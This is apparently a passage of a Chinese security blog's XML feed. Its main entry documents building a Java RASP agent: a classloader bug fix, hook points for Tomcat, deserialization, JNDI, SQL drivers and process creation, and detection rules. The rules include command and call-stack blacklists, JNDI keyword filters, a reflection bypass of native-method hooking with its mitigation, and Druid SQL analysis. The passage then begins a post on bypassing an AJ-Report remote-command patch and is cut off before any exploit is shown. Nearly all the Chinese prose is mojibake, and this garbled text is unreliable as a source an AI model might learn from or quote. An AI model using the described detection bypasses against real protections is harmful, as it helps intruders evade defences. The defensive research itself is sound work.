        <content type="html"><![CDATA[<blockquote><p>æœ¬äººç ”ç©¶è¯¾é¢˜å¤§æ¦‚å¯ä»¥ç†è§£ä¸ºåŸºäºRASPåšåœºæ™¯åº”ç”¨è¿ç§»ã€‚æœ¬æ¥å¯ä»¥æŠŠå¼€æºé¡¹ç›®æ‹¿è¿‡æ¥ç”¨ï¼Œä¸è¿‡ç›®å‰å¼€æºçš„RASPéƒ½æœ‰å„è‡ªçš„ç¼ºç‚¹ï¼Œå¹¶ä¸”è¦æŠŠç»†èŠ‚çœ‹æ‡‚ä¹Ÿå¾—èŠ±è´¹ä¸€äº›æ—¶é—´ã€‚ç´¢æ€§å°±è‡ªå·±å†™ä¸€ä¸ªå§ï¼Œé¡ºä¾¿åŠ å¼ºå¯¹JAVAçš„ç†è§£ã€‚</p></blockquote><h3 id="è”è°ƒå¯åŠ¨æµ‹è¯•"><a href="#è”è°ƒå¯åŠ¨æµ‹è¯•" class="headerlink" title="è”è°ƒå¯åŠ¨æµ‹è¯•"></a>è”è°ƒå¯åŠ¨æµ‹è¯•</h3><p>å°†æµ‹è¯•é¶åœºæ·»åŠ ä½œä¸ºä¸€ä¸ª<code>module</code>æ·»åŠ è‡³<code>agent</code>é¡¹ç›®å½“ä¸­ã€‚è®¾ç½®<code>VM options:-javaagent:F:\xxx\xxx-agent\target\xxx-launcher-0.0.1.jar=xxxHome=../123;coreVersion=0.0.1</code>å³å¯ã€‚</p><h3 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h3><h4 id="type-xxx-not-present-ClassWriter"><a href="#type-xxx-not-present-ClassWriter" class="headerlink" title="type xxx not present(ClassWriter)"></a>type xxx not present(ClassWriter)</h4><p>åœ¨<code>hook</code> <code>org/apache/catalina/core/StandardWrapperValve#invoke</code>æ–¹æ³•æ—¶ï¼ŒæŠ¥é”™<code>Type org/apache/catalina/connector/ClientAbortException not present</code>ï¼Œçœ‹æŠ¥é”™æ˜¯<code>ClassWriter#getCommonSuperClass</code>æ–¹æ³•å‡ºäº†é—®é¢˜ã€‚</p><p><code>ASM</code>åœ¨è®¡ç®—æ–¹æ³•çš„æœ€å¤§æ ˆç©ºé—´æ—¶ä¼šè°ƒç”¨<code>getCommonSuperClass</code>æ–¹æ³•è®¡ç®—ç»™å®šä¸¤ä¸ªç±»çš„å…±åŒçˆ¶ç±»ï¼Œç„¶è€Œè¿™ä¸¤ä¸ªç±»æ˜¯ç”¨<code>this.getClass().getClassLoader()</code>å¾—åˆ°çš„ç±»åŠ è½½å™¨åŠ è½½çš„ï¼Œè¿™é‡Œå¯¹åº”<code>Launcher$AppClassLoader</code>ï¼Œåœ¨åŠ è½½<code>org/apache/catalina/core/StandardWrapperValve</code>ä¼šåŠ è½½ä¸åˆ°ï¼Œç„¶åå°è£…äº†ä¸€ä¸‹æŠ›å‡º<code>type xxx not present</code>ï¼Œå®é™…ä¸Šå°±æ˜¯ç±»åŠ è½½ä¸åˆ°ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240619102838499.png" alt="image-20240619102838499"></p><p>è§£å†³æ–¹æ¡ˆæ˜¯é‡å†™<code>getCommonSuperClass</code>ï¼Œå°†<code>classLoader</code>ä¿®æ”¹ä¸º<code>transform</code>æ–¹æ³•ä¼ è¿‡æ¥çš„<code>classloader</code>ï¼ˆå³åŠ è½½ç±»æœ¬èº«çš„ç±»åŠ è½½å™¨ï¼‰ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> String <span class="token function">getCommonSuperClass</span><span class="token punctuation">(</span>String type1<span class="token punctuation">,</span> String type2<span class="token punctuation">)</span> <span class="token punctuation">{</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> class1<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    class1 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>type1<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> targetClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TypeNotPresentException</span><span class="token punctuation">(</span>type1<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> class2<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    class2 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>type2<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> targetClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TypeNotPresentException</span><span class="token punctuation">(</span>type2<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>class1<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>class2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> type1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>class2<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>class1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> type2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>class1<span class="token punctuation">.</span><span class="token function">isInterface</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> class2<span class="token punctuation">.</span><span class="token function">isInterface</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">"java/lang/Object"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span>        class1 <span class="token operator">=</span> class1<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>class1<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>class2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> class1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="agentå…±äº«åº”ç”¨è¿è¡Œæ—¶å¸¦çš„ç±»åº“"><a href="#agentå…±äº«åº”ç”¨è¿è¡Œæ—¶å¸¦çš„ç±»åº“" class="headerlink" title="agentå…±äº«åº”ç”¨è¿è¡Œæ—¶å¸¦çš„ç±»åº“"></a>agentå…±äº«åº”ç”¨è¿è¡Œæ—¶å¸¦çš„ç±»åº“</h4><p>åœ¨<code>hook</code>ç¬¬ä¸‰æ–¹ç±»åº“æ—¶ï¼Œé€šå¸¸éœ€è¦è°ƒç”¨è¯¥ç±»åº“çš„æ–¹æ³•ã€‚è€Œ<code>rasp</code>æœ¬èº«æ²¡æœ‰æŒ‡å®šçš„ç±»åº“æ•…è€Œä¸èƒ½æ–¹ä¾¿çš„ç¼–å†™é˜²æŠ¤é€»è¾‘ï¼Œå¦‚æœ<code>rasp</code>è‡ªå¸¦ä»¥æ¥çš„è¯ä¼šæœ‰å†²çªé—®é¢˜ã€‚</p><p><strong>è§£å†³æ–¹æ³•ä¸€ï¼š</strong></p><p>å…¨éƒ¨ç”±åå°„è§£å†³ï¼Œåº”ç”¨è¿è¡Œæ—¶æ˜¯<code>JVM</code>æ˜¯æŠŠè¿™ä¸ªç±»è£…è½½è¿›å»çš„ã€‚</p><p><strong>è§£å†³æ–¹æ¡ˆäºŒï¼š</strong></p><p><code>maven</code>å¯ä»¥é€šè¿‡<code>scope</code>æŒ‡å®šç±»åº“çš„ä½œç”¨é˜¶æ®µï¼Œ<code>provided</code>è¡¨ç¤ºè¿™ä¸ªåº“ä»…åœ¨å¼€å‘çš„æ—¶å€™å­˜åœ¨ï¼Œåœ¨è¿è¡Œæ—¶è¿™ä¸ªåº“æ˜¯ä¸å­˜åœ¨çš„ã€‚</p><pre><code>&lt;scope&gt;provided&lt;/scope&gt;</code></pre><p>ä¸è¿‡è¿™ä¹ˆåšä¹Ÿä¼šæœ‰éš”ç¦»çš„<code>classloader</code>åŠ è½½ä¸åˆ°åº”ç”¨ç±»åº“çš„æƒ…å†µï¼Œéœ€è¦é‡å†™ç±»åŠ è½½å™¨æ¥åŠ è½½<code>hook</code>åŠé˜²æŠ¤é€»è¾‘ã€‚</p><h4 id="Thread-currentThread-getStackTrace-ä¸ºç©º"><a href="#Thread-currentThread-getStackTrace-ä¸ºç©º" class="headerlink" title="Thread.currentThread().getStackTrace();ä¸ºç©º"></a>Thread.currentThread().getStackTrace();ä¸ºç©º</h4><p>æœ‰æ—¶å€™ä¼šå‡ºç°è¿™ä¸ªbugï¼ŒåŸå› æœªçŸ¥ã€‚</p><h3 id="æ’æ¡©ç±»"><a href="#æ’æ¡©ç±»" class="headerlink" title="æ’æ¡©ç±»"></a>æ’æ¡©ç±»</h3><table><thead><tr><th>ID</th><th>å¤§ç±»</th><th>å°ç±»</th><th>å¾…Hookç±»ã€æ–¹æ³•</th><th>è§£é‡Š</th><th>æ£€æµ‹æ–¹æ³•</th></tr></thead><tbody><tr><td>1</td><td>æ‹¿åˆ°ç”¨æˆ·è¯·æ±‚ä¿¡æ¯ï¼Œhookè¿”å›ä¿¡æ¯</td><td>tomcat</td><td>org.apache.catalina.core.StandardWrapperValve#invoke</td><td>tomcatè¯·æ±‚è§£æåˆ°wrapperå±‚å‚æ•°ä¸ºrequest,response</td><td>é»‘åå•è¿‡æ»¤</td></tr><tr><td>2</td><td>ååºåˆ—åŒ–é˜²æŠ¤</td><td>åŸç”Ÿååºåˆ—åŒ–</td><td>java.io.ObjectInputStream#resolveClass</td><td>ååºåˆ—åŒ–readDescæ‹¿åˆ°classé€šè¿‡resolveClassåŠ è½½ç±»</td><td>ç™½åå•æ”¾è¡Œ+é»‘åå•è¿‡æ»¤</td></tr><tr><td>3</td><td>jndiæ³¨å…¥é˜²æŠ¤</td><td></td><td>com.sun.jndi.toolkit.url.GenericURLContext#lookup</td><td>éƒ½ä¼šèµ°æŠ½è±¡ç±»ï¼Œæ£€æµ‹</td><td>é»‘åå•è¿‡æ»¤</td></tr><tr><td>4</td><td>sqlæ³¨å…¥</td><td>msql</td><td>com.mysql.jdbc.ConnectionImpl#execSQL</td><td>æ— è®ºé¢„ç¼–è¯‘è¿˜æ˜¯ç›´æ¥ç¼–è¯‘æ‰§è¡Œéƒ½ä¼šèµ°åˆ°execSQL</td><td>è¯­ä¹‰</td></tr><tr><td></td><td></td><td>oracle</td><td>oracle.jdbc.diagnostics.Diagnosable#beginCurrentSql</td><td>æ— è®ºé¢„ç¼–è¯‘è¿˜æ˜¯ç›´æ¥ç¼–è¯‘æ‰§è¡Œéƒ½ä¼šèµ°åˆ°beginCurrentSql</td><td>è¯­ä¹‰</td></tr><tr><td></td><td></td><td>sqlserver</td><td>com.microsoft.sqlserver.jdbc.SQLServerPreparedStatementï¼Œcom.microsoft.sqlserver.jdbc.SQLServerStatement</td><td>ä¸€ç³»åˆ—executeæ–¹æ³•</td><td>è¯­ä¹‰</td></tr><tr><td></td><td></td><td>pgsql</td><td>org.postgresql.jdbc.PgStatement</td><td>ä¸€ç³»åˆ—executeæ–¹æ³•</td><td>è¯­ä¹‰</td></tr><tr><td></td><td></td><td>db2</td><td>com.ibm.db2.jcc.am</td><td>db2æœ‰äº›ä¸åŒï¼Œè¿™ä¸ªåŒ…ä¸‹çš„æ‰€æœ‰ç±»éƒ½æœ‰å¯èƒ½æ˜¯</td><td>è¯­ä¹‰</td></tr><tr><td>5</td><td>å‘½ä»¤æ‰§è¡Œé˜²æŠ¤</td><td>windows</td><td>java.lang.ProcessImpl#create</td><td>native method</td><td>å¤šç§ç‰¹å¾ç®—æ³•</td></tr><tr><td></td><td></td><td>linux</td><td>java.lang.ProcessImpl#forkAndExec,                                     java.lang.UnixProcess#forkAndExec</td><td>native method,jdk&lt;&#x3D;8çš„æƒ…å†µä¸‹ä¼šè°ƒç”¨java.lang.UnixProcessè¿™ä¸ªç±»</td><td>åŒä¸Š</td></tr></tbody></table><h3 id="æ£€æµ‹é€»è¾‘"><a href="#æ£€æµ‹é€»è¾‘" class="headerlink" title="æ£€æµ‹é€»è¾‘"></a>æ£€æµ‹é€»è¾‘</h3><h4 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h4><p><code>java</code>çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æœ€ç»ˆéƒ½ä¼šèµ°åˆ°<code>java.lang.ProcessImpl</code>ï¼Œåœ¨<code>windows</code>ä¸‹è°ƒç”¨<code>create</code>æ–¹æ³•ã€åœ¨<code>linux</code>ä¸‹è°ƒç”¨<code>forkAndExec</code>ã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä»–ä»¬éƒ½æ˜¯<code>native</code>æ–¹æ³•ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240710111321364.png" alt="image-20240710111321364"></p><p>ä¼—æ‰€å‘¨çŸ¥<code>native</code>æ–¹æ³•ä¸èƒ½æœ‰æ–¹æ³•ä½“ï¼Œç›®å‰çš„è§£å†³æ–¹æ¡ˆä¸ºï¼š</p><ol><li>é€šè¿‡<code>premain/agantmain</code>æ‹¿åˆ°<code>instrumentation</code>ï¼Œè°ƒç”¨<code>inst#setNativeMethodPrefix</code>ç»™è¦è°ƒç”¨çš„<code>native</code>æ–¹æ³•è®¾ç½®ä¸€ä¸ªå‰ç¼€ã€‚</li><li>é€šè¿‡<code>ASM</code>ä¿®æ”¹åŸæ¥è¦<code>hook</code>çš„æ–¹æ³•ï¼Œå°†å…¶ä¿®é¥°ç¬¦ä¿®æ”¹ä¸ºé<code>native</code>ã€‚</li><li>è¿™æ ·å»æ‰<code>native</code>çš„å‡½æ•°å°±å¯ä»¥æ¤å…¥ç›‘æ§ä»£ç ï¼Œæœ€ç»ˆè°ƒç”¨<code>$$PREFIX$$method</code>æ¥è°ƒç”¨ã€‚</li></ol><p>ä¸è¿‡è¿™æ ·ä¹Ÿåªæ˜¯ç¼“è§£é—®é¢˜ï¼Œå› ä¸ºæ”»å‡»è€…ç›´æ¥åå°„éå†<code>$$PREFIX$$</code>å‰ç¼€çš„<code>method</code>ç„¶åæ‰§è¡Œå°±å¯ä»¥ç»•è¿‡äº†ã€‚</p><p>åŸºäºä»¥ä¸Šç»•è¿‡æ–¹å¼ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹æ–¹å¼ç¼“è§£ï¼š</p><ol><li>ç”Ÿæˆçš„å‰ç¼€å…·å¤‡éšæœºæ€§ï¼Œä¹Ÿå°±æ˜¯è¯´æ”»å‡»è€…ä¸èƒ½é€šè¿‡å…ˆéªŒçŸ¥è¯†ç›´æ¥æ‹¿åˆ°<code>PREFIX</code>ã€‚</li><li>é€šè¿‡éšæœºç”Ÿæˆå‰ç¼€å‡½æ•°æ·»åŠ ä¸€å †è™šå‡çš„<code>wrapper_method</code>ï¼ˆä¸€å †<code>native</code>ï¼‰ï¼Œä½†åªæœ‰ä¸€ä¸ªæ–¹æ³•æ˜¯å¯ä»¥è¢«è°ƒç”¨çš„ï¼ˆæ‰§è¡Œå‡çš„<code>wrapper_method</code>ï¼‰ã€‚è¿™æ ·æ”»å‡»è€…å¾ˆéš¾æ‰¾åˆ°å“ªä¸ªæ˜¯çœŸçš„ï¼ˆå¯ä»¥è¢«<code>JVM</code>è¯†åˆ«çš„ï¼‰<code>wrapper_method</code>ã€‚</li></ol><p>ç”Ÿæˆçš„çœŸå‡ç¾çŒ´ç‹ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240710191056567.png" alt="image-20240710191056567"></p><p>å¯¹äºæ£€æµ‹ç®—æ³•æ¥è¯´ï¼Œç›®å‰å¤§ä½“æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>å¦‚æœ<code>GETã€POSTã€HEADER</code>å‚æ•°åŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç›´æ¥åˆ¤å®šä¸ºåé—¨ã€‚è¿™å—è¿˜å¾—å†è€ƒè™‘ï¼Œå› ä¸ºæœ‰çš„åå°å°±è‡ªå¸¦å®šæ—¶ä»»åŠ¡åŠŸèƒ½ï¼Œè¿™ç§æƒ…å†µä¹Ÿä¼šè¢«æ‹¦æˆªã€‚</li><li>å¦‚æœæ‰§è¡Œçš„å‘½ä»¤åœ¨é»‘åå•ä¸­ï¼Œé‚£ä¹ˆæ‹¦æˆªã€‚</li><li>å¦‚æœæ‰§è¡Œå‘½ä»¤çš„è°ƒç”¨æ ˆåœ¨æ ˆé»‘åå•ä¸­ï¼ŒåŒæ ·æ‹¦æˆªã€‚</li><li>å¯¹äºæ‰§è¡Œçš„ä»»æ„å‘½ä»¤éƒ½è®°å½•åœ¨æ—¥å¿—ä¸­ã€‚</li></ol><h4 id="jndiæ£€æµ‹"><a href="#jndiæ£€æµ‹" class="headerlink" title="jndiæ£€æµ‹"></a>jndiæ£€æµ‹</h4><ol><li>é»‘åå•è¿‡æ»¤ä¸€äº›å­—ç¬¦çº§çš„ç‰¹å¾ï¼Œå¾ˆå¤šä¸€æŠŠå—¦å·¥å…·çš„<code>jndi</code>åœ°å€æœ‰<code>exploit</code>,<code>shell</code>ç­‰ç‰¹å¾ã€‚</li><li>é»‘åå•è¿‡æ»¤è°ƒç”¨æ ˆï¼Œè¿‡æ»¤ä¸€äº›å¸¸è§çš„<code>fastjson</code>ï¼Œ<code>yaml</code> sinkç‚¹ã€‚</li></ol><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><ol><li><code>hook</code>ç‚¹æœ‰æ‰€ä¸åŒï¼Œæœ‰äº›<code>rasp</code>é’ˆå¯¹æœ€å¸¸è§çš„æ•°æ®åº“<code>mysql</code>ï¼Œé€‰æ‹©å¯¹<code>PreparedStatementï¼ŒStatementImpl</code>æ’æ¡©åšä¸åŒç‰ˆæœ¬çš„é€‚é…ï¼Œä½†æœ€åéƒ½ä¼šèµ°åˆ°<code>com.mysql.jdbc.ConnectionImpl#execSQL</code>ï¼Œæ‰€ä»¥è¿™é‡Œ<code>hook execSQL</code>ã€‚</li><li>åœ¨æ‹¿åˆ°<code>sql</code>è¯­å¥åï¼Œç”¨<code>druid</code>æä¾›çš„<code>WallUtils.isValidateXXX()</code>åšè¯­ä¹‰åˆ†æã€‚</li></ol><p>â€‹è¯¥æ–¹æ³•å…ˆè°ƒç”¨<code>checkWhiteAndBlackList</code>è¿›è¡Œé»‘ç™½åå•æ£€æµ‹ï¼Œä¸è¿‡é»˜è®¤é…ç½®é»‘ç™½åå•éƒ½æ˜¯ç©ºçš„ã€‚</p><p>â€‹é¦–å…ˆè¿›è¡Œè¯æ³•åˆ†æï¼Œè¿™é‡Œå¯ä»¥ç†è§£ä¸ºåˆ†è¯ï¼Œåœ¨è¿™ä¸ªé˜¶æ®µä¼šæœ‰ä¸€äº›è¿‡æ»¤ï¼Œæ¯”å¦‚è‡ªåŠ¨ä¼šå°†æ³¨é‡Šçš„éƒ¨åˆ†åˆ é™¤ï¼Œé‡æ–°æ‹¼æ¥SQLè¯­å¥åï¼Œå¯¹â€è§„èŒƒåŒ–â€åçš„è¯­å¥å†è¿›è¡Œæ³¨å…¥æ£€æµ‹ï¼Œåˆ é™¤æ³¨é‡Šçš„ä»£ç é€»è¾‘åœ¨è¯æ³•è§£æå™¨ä¸­ã€ä¸å…è®¸æ‰§è¡Œå¤šæ¡è¯­å¥ç­‰ã€‚</p><p>â€‹ä¹‹åå°†<code>sql</code>è¯­å¥è§£æä¸ºè¯­æ³•æ ‘ï¼ˆ<code>AST</code>æ ‘ï¼‰ï¼Œ<a href="https://www.cnblogs.com/LittleHann/p/3514532.html">https://www.cnblogs.com/LittleHann/p/3514532.html</a> è¿™ç¯‡æ–‡ç« çš„è§£é‡Šå¾ˆå¥½ï¼Œä¸è¿‡çœ‹ä¸Šå»druidç»´æŠ¤ä¸€ä¸ªASTæ ‘ç”¨visitorè®¿é—®æ˜¯ä¸ºäº†æ–¹ä¾¿ç»Ÿä¸€ç»´æŠ¤è§„åˆ™ã€‚<code>com.alibaba.druid.wall.WallProvider#checkInternal</code>è¯¥æ–¹æ³•æ˜¯æ£€æµ‹çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œå…ˆæ ¹æ®é…ç½®æƒ…å†µæ‹¦æˆªå¸¦æœ‰æ³¨é‡Šçš„SQLè¯­å¥ã€å †å æŸ¥è¯¢çš„SQLè¯­å¥ï¼Œéšååˆ›å»º WallVisitorï¼Œè€Œ WallVisitor æ‹¥æœ‰å¤šç§æ£€æŸ¥é¡¹ï¼ŒåŒ…æ‹¬ç¦æ­¢å˜é‡è®¿é—®æˆ–æ˜¯å˜é‡é»‘åå•ã€ç¦æ­¢æ°¸çœŸè¯­å¥ã€ç¦æ­¢é»‘åå•å‡½æ•°ã€ç¦æ­¢è®¿é—®é»‘åå•è¡¨ï¼ˆæ•°æ®åº“ç³»ç»Ÿè¡¨ï¼‰ç­‰ï¼Œå…¶ä¸­ä¸€äº›å¤æ‚çš„æƒ…å†µåˆ™è¢«è®¾ç½®æˆé…ç½®é€‰é¡¹ï¼Œå¦‚ç¦æ­¢å†™æ–‡ä»¶ã€‚æ£€æµ‹ä¸é€šè¿‡åˆ™SQLè¯­å¥ä¼šè¢«åŠ å…¥é»‘åå•ï¼Œæ£€æµ‹é€šè¿‡åˆ™SQLè¯­å¥ä¸å‚æ•°åŒ–åçš„SQLè¯­å¥éƒ½ä¼šè¢«åŠ å…¥é»‘åå•ã€‚</p><pre><code>SQLObjectï¼šè¿™æ˜¯æ‰€æœ‰ASTèŠ‚ç‚¹çš„åŸºæ¥å£ï¼Œä»£è¡¨SQLä¸­çš„ä»»ä½•å¯è¯†åˆ«ç»“æ„ã€‚SQLExpr ï¼ˆSQLè¡¨è¾¾å¼ï¼‰ï¼šæ‰©å±•è‡ªSQLObjectï¼Œä»£è¡¨SQLä¸­çš„è¡¨è¾¾å¼ï¼Œå¦‚å­—é¢é‡ã€åˆ—å¼•ç”¨ã€å‡½æ•°è°ƒç”¨ç­‰ã€‚SQLIdentifierï¼šä»£è¡¨SQLä¸­çš„æ ‡è¯†ç¬¦ï¼Œæ¯”å¦‚åˆ—åæˆ–è¡¨åã€‚SQLNumericLiteralï¼šä»£è¡¨æ•°å­—å­—é¢é‡ã€‚SQLCharLiteralï¼šä»£è¡¨å­—ç¬¦ä¸²å­—é¢é‡ã€‚SQLFunctionï¼šä»£è¡¨SQLå‡½æ•°è°ƒç”¨ã€‚SQLBinaryOpExprï¼šä»£è¡¨äºŒå…ƒè¿ç®—è¡¨è¾¾å¼ï¼Œå¦‚åŠ ã€å‡ã€ä¹˜ã€é™¤ç­‰ã€‚SQLStatement ï¼ˆSQLè¯­å¥ï¼‰ï¼šåŒæ ·æ‰©å±•è‡ªSQLObjectï¼Œä»£è¡¨å®Œæ•´çš„SQLè¯­å¥ç»“æ„ã€‚SQLSelectStatementï¼šä»£è¡¨SELECTè¯­å¥ã€‚SQLInsertStatementï¼šä»£è¡¨INSERTè¯­å¥ã€‚SQLUpdateStatementï¼šä»£è¡¨UPDATEè¯­å¥ã€‚SQLDeleteStatementï¼šä»£è¡¨DELETEè¯­å¥ã€‚SQLSelect å’Œ SQLSelectQueryBlockï¼šæ›´å…·ä½“çš„èŠ‚ç‚¹ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºSELECTæŸ¥è¯¢çš„ç»†èŠ‚ï¼ŒåŒ…æ‹¬æŸ¥è¯¢çš„ç›®æ ‡åˆ—ã€FROMå­å¥ã€WHEREæ¡ä»¶ã€GROUP BYã€HAVINGç­‰ã€‚SQLTableSourceï¼šä»£è¡¨æ•°æ®æ¥æºï¼Œå¦‚è¡¨åã€å­æŸ¥è¯¢æˆ–JOINè¡¨è¾¾å¼ã€‚</code></pre><p>â€‹    ä¸‹å›¾ä¸æ˜¯<code>druid</code>çš„é˜²å¾¡é€»è¾‘ï¼Œä½†æ„Ÿè§‰è¿™ç§é›¶è§„åˆ™æ£€æµ‹ä¹ŸæŒºæœ‰é“ç†çš„ã€‚ä»ç»“æ„ä¸Šä¹Ÿèƒ½çœ‹å‡ºæ¥<code>sql</code>è¯­å¥å‘ç”Ÿäº†è¯­ä¹‰åç§»ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/_cgi-bin_mmwebwx-bin_webwxgetmsgimg__&MsgID=5376840760791682442&skey=@crypt_35524207_3ee024e1010e9ebbdbdb77433f8e5a7d&mmweb_appid=wx_webfilehelper.jpg" alt="_cgi-bin_mmwebwx-bin_webwxgetmsgimg__&amp;MsgID=5376840760791682442&amp;skey=@crypt_35524207_3ee024e1010e9ebbdbdb77433f8e5a7d&amp;mmweb_appid=wx_webfilehelper"></p><h3 id="è¿›åº¦"><a href="#è¿›åº¦" class="headerlink" title="è¿›åº¦"></a>è¿›åº¦</h3><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ol><li><p><a href="https://www.cnblogs.com/LittleHann/p/13580927.html">https://www.cnblogs.com/LittleHann/p/13580927.html</a></p></li><li><p><a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">https://rasp.baidu.com/doc/hacking/architect/hook.html</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç ”ç©¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVAå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AJ-REPORT 1.4.1æœªæˆæƒè¿œç¨‹å‘½ä»¤ä¿®å¤ç»•è¿‡</title>
      <link href="/2024/05/10/aj-report-yuan-cheng-ming-ling-zhi-xing-rao-guo/"/>
      <url>/2024/05/10/aj-report-yuan-cheng-ming-ling-zhi-xing-rao-guo/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼Œ<a href="https://xz.aliyun.com/t/14460">ä¼ é€é—¨</a>ã€‚</p></blockquote><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>å‰å‡ å¤©åœ¨å…¬ä¼—å·çœ‹åˆ°<code>AJ-Report</code>æœªæˆæƒè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œè¿™ä¸ªæ´è¿˜æŒºé€šæ€çš„ã€‚ä»Šå¤©çœ‹äº†ä¸‹å‘½ä»¤æ‰§è¡Œä¼¼ä¹å·²ç»ä¿®å¤äº†ï¼Œä½†æ˜¯è¿™é‡Œçš„<code>patch</code>æ²¡å•¥ç”¨ã€‚è€Œä¸”æœ€å…³é”®çš„é‰´æƒç»•è¿‡æ²¡ä¿®ï¼Œå…¶å®é‰´æƒä¿®å¤äº†ä¹Ÿä¼šæœ‰é»˜è®¤<code>key</code>å¯¼è‡´é‰´æƒç»•è¿‡çš„é—®é¢˜ã€‚æ–‡æœ«ç»™å‡ºäº†åˆ©ç”¨å·¥å…·ã€‚</p><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><h5 id="é‰´æƒç»•è¿‡"><a href="#é‰´æƒç»•è¿‡" class="headerlink" 